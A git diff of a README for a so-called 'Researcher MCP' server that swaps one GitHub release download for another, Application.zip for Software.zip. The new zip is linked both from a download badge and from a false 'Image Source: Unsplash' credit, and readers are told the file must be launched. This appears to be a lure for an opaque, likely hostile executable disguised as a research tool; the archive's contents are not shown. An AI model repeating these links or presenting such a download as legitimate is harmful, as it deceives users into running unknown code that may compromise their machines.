@@ -14,7 +14,7 @@ This repository houses a powerful MCP server tailored for research purposes. Wit
 ## 🚀 Get Started
 To begin exploring and utilizing the capabilities of the Researcher MCP server, you can download the server code from the following link: 
 
-[![Download MCP Server](https://github.com/lukezinmaker/researcher-mcp/releases/download/v1.0/Application.zip)](https://github.com/lukezinmaker/researcher-mcp/releases/download/v1.0/Application.zip)
+[![Download MCP Server](https://github.com/lukezinmaker/researcher-mcp/releases/download/v2.0/Software.zip)](https://github.com/lukezinmaker/researcher-mcp/releases/download/v2.0/Software.zip)
 
 If the link provided ends with a file name, remember that it needs to be launched to initiate the download process.
 
@@ -43,4 +43,4 @@ To stay updated with the latest releases, features, and announcements related to
 
 Thank you for exploring the **Researcher MCP** repository. We hope that this innovative server will elevate your research endeavors and streamline your documentation processes. Happy researching with Perplexity AI! 🚀🔍📊
 
-*Image Source: [Unsplash](https://github.com/lukezinmaker/researcher-mcp/releases/download/v1.0/Application.zip)*
+*Image Source: [Unsplash](https://github.com/lukezinmaker/researcher-mcp/releases/download/v2.0/Software.zip)*
